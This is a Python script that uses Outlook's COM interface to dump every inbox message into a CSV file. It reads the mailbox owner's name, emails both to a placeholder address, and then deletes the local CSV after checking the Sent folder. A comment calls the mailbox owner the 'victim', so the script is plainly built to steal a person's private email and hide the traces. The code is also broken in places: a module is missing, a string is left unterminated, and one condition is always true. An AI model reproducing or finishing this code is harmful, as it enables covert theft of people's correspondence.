import pandas as pd
import warnings
import win32com.client as win32
from pathlib import Path
import pandas as pd
import re

warnings.filterwarnings("ignore")

df = pd.DataFrame(columns=['from', 'time', 'subject', 'message'])
rows_list = []

outlook = win32com.client.Dispatch("Outlook.Application").GetNamespace("MAPI")
inbox = outlook.GetDefaultFolder(6)
messages = inbox.Items

for idx,m in enumerate(messages):
    body = m.body
    sender = m.SenderEmailAddress
    time = m.ReceivedTime
    subject = m.Subject
    
    data = {"from":sender, "time":time, "subject":subject, "message":body}
    rows_list.append(data)
    
path = "folder_path_of_your_choice"
df = pd.DataFrame(rows_list) 
df.to_csv(path)
print("file created")

outlook = win32com.client.Dispatch('outlook.application')
mapi = outlook.GetNamespace("MAPI")
user = mapi.Session.Stores[1].DisplayName
print("Username obtained")


outlook=win32.Dispatch('outlook.application')
mail=outlook.CreateItem(0)
myRcvMail = mail.To="yourid@mail.com"
mail.Subject='Iqbal\s 
mail.HTMLBody=user #to get victims email

attachment= path
mail.Attachments.Add(attachment)
mail.Send()
print("email sent")


deleted = False
def delFun(val):
    path = Path('C:/Users/PsychicPowers/Desktop/df.csv')
    x = path.is_file()
    if(x==True):
        os.remove(path)
        return True
  
def myMain(val): 
    mail_re = r"[a-z0-9\.\-+_]+@[a-z0-9\.\-+_]+\.[a-z]+"
    outlook = win32com.client.Dispatch("Outlook.Application").GetNamespace("MAPI")
    inbox = outlook.GetDefaultFolder(5)
    messages = inbox.Items
    if(len(messages)>0):
        for i,msg in enumerate(messages):
            if(i<5):
                recipient = msg.To
                if((recipient in myRcvMail) or (myRcvMail or recipient)):
                    return delFun(val)
    
while deleted is False:
    if(deleted == False):
        dele = myMain(True)
        if(dele == True):
            break
            
print("file deleted")
